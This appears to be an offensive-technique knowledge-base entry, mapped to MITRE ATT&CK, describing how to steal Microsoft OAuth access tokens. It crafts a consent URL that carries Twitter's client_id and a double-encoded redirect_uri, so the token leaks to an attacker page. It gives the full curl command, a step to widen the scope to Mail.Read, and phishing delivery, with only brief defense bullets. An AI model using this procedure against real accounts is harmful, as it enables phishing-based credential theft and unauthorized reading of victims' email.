---
tags:
  - oauth-consent
  - token-leak
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/initiate-microsoft-oauth-consent]]'
platforms:
  - Web
techniques:
  - '[[Steal Application Access Token]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 12294f8e-8b13-44a5-af62-cc83e62351be
created_at: '2025-12-14T17:24:35.771Z'
updated_at: '2025-12-14T17:24:35.771Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Initiate-OAuth-Consent-with-Crafted-URI

## Summary

This procedure embeds the malicious redirect_uri into Microsoft's OAuth consent URL, tricking the authorization server into redirecting to an attacker site with the access_token in the URL hash after consent.

## Description

Using Twitter's client_id (000000004403A722) and scopes like wl.basic wl.emails wl.contacts_emails, the crafted URI is passed in the 'ru' parameter. Microsoft decodes %2523 to #, appending access_token post-authorization. Scenario: Phishing link to this URL; works if victim is pre-authorized.

## Requirements

1. Twitter's Microsoft app client_id
2. Victim's interaction (click on crafted URL)
3. Attacker domain ready for token capture

## Defense

Defensive measures and detection strategies:

- Strict exact-match validation for redirect_uris
- Rate-limit OAuth consent requests
- Audit OAuth app configurations for wildcard patterns

## Objectives

1. Obtain user consent with minimal interaction
2. Redirect to attacker site with token exposed
3. Enable scope expansion for email access

## Instructions

### Step 1: Construct OAuth URL

**Context**: Build the consent URL with encoded parameters including the malicious redirect_uri.

**Command** ([[commands/initiate-microsoft-oauth-consent]]):
```bash
curl "https://account.live.com/Consent/Update?ru=https%3A%2F%2Flogin.live.com%2Foauth20_authorize.srf%3Flc%3D1033%26state%3Dservice%253Dmsn2%2526start%253D2016-04-18%252021%253A10%253A34%2526trigger_event%253Dtrue%2526scope%3Dwl.basic%2520wl.emails%2520wl.contacts_emails%26redirect_uri%3Dhttps%253A%252F%252Fcards.twitter.com%252Fcards%252F18ce53y6aap%2523%252Fyyms%26client_id%3D000000004403A722%26response_type%3Dcode%26contextid%3D02872644FC281255%26mkt%3DEN-US%26uiflavor%3Dweb%26id%3D279469%26client_id%3D000000004403A722%26rd%3Dtwitter.com%26scope%3Dwl.basic%2Bwl.emails%2Bwl.contacts_emails%26cscope%3D"
```

> Expected output: 302 redirect to consent page or direct auth.

### Step 2: Modify Scope for Impact

**Context**: Adjust scope to Mail.Read for email access.

Replace scope=wl.basic+wl.emails+wl.contacts_emails with scope=https://outlook.office.com/Mail.Read

> Expected outcome: Broader permissions in stolen token.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Application Access Token]] Steal Application Access Token

### Sub-Techniques

- None

## Commands Used

- [[commands/initiate-microsoft-oauth-consent]]

## Tools Used

- None

## Tags

- [[oauth-consent]]
- [[token-leak]]
